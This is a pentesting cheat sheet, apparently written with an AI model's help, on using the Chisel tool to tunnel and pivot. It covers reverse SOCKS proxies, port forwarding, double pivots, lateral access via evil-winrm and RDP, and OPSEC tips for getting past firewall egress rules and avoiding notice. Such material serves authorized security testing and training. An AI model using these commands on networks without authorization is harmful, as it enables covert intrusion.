# Chisel

**Tags:** `#chisel` `#proxy` `#tunnel` `#pivoting` `#socks5`

Fast TCP/UDP tunneling tool over HTTP/HTTPS. Creates SOCKS5 proxy or port forwarding tunnels through firewalled/NAT'd networks. Written in Go — single binary for both server and client. Essential for pivoting when ligolo-ng isn't available.

**Source:** https://github.com/jpillora/chisel
**Install:** `sudo apt install chisel` or download precompiled binary from releases

```bash
# Kali (server)
chisel server --reverse --port 8080

# Target (client)
./chisel client 10.10.14.5:8080 R:socks
```

> [!note]
> `R:socks` creates a reverse SOCKS5 proxy on Kali at `127.0.0.1:1080`. Route traffic through it with proxychains. Use `--socks5` on the server side; the `R:` prefix means the client initiates (reverse tunnel).

---

## Setup

```bash
# Download matching arch binary for target
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && mv chisel_linux_amd64 chisel && chmod +x chisel

# Windows binary
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_windows_amd64.gz
```

Transfer to target via your preferred method (SCP, SMBserver, HTTP, etc.).

---

## Reverse SOCKS5 Proxy (Most Common)

```bash
# Kali — start server (accepts reverse tunnels)
chisel server --reverse --port 8080 --socks5

# Target — connect back, create SOCKS5 on Kali:1080
./chisel client 10.10.14.5:8080 R:socks

# proxychains.conf
# socks5 127.0.0.1 1080

# Use
proxychains nmap -sT -Pn -p 445,3389 172.16.5.10
proxychains evil-winrm -i 172.16.5.10 -u user -p pass
```

---

## Port Forwarding

```bash
# Forward Kali:3333 → Target's internal 172.16.5.10:3389
# Kali server
chisel server --reverse --port 8080

# Target client
./chisel client 10.10.14.5:8080 R:3333:172.16.5.10:3389

# Connect from Kali
xfreerdp /v:127.0.0.1:3333 /u:administrator /p:Password123
```

---

## Forward Proxy (Client Initiates, Kali Connects)

```bash
# Target — run server
./chisel server --port 8080 --socks5

# Kali — connect, SOCKS5 on Kali:1080
chisel client 10.129.14.128:8080 socks
```

---

## Double Pivot

```bash
# Pivot 1: Kali → Host1 (reverse SOCKS on :1080)
# Host1:
./chisel client 10.10.14.5:8080 R:socks

# Pivot 2: From Host1 → Host2 (reverse SOCKS on :1081)
proxychains chisel client 172.16.5.10:9090 R:1081:socks
# (need chisel server on Host2 first via proxychains)
```

---

## Key Flags

| Flag | Description |
|------|-------------|
| `server` | Run as server |
| `client <server> <tunnel>` | Run as client |
| `--reverse` | Allow reverse tunnels (server-side) |
| `--port <n>` | Listen port |
| `--socks5` | Enable SOCKS5 (server) |
| `R:socks` | Reverse SOCKS5 tunnel (client) |
| `R:<lport>:<host>:<rport>` | Reverse port forward |
| `--auth <user:pass>` | Basic auth |
| `--tls-ca` | Custom CA cert |

---

## OPSEC

- HTTP/HTTPS traffic — blends with web traffic, bypasses most firewall egress rules
- Use `--tls-domain` with a valid domain + cert for HTTPS to blend further
- Default port 8080 is common — change to 443 or 80 for less attention
- Single binary — easy to transfer, easy to remove after use

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
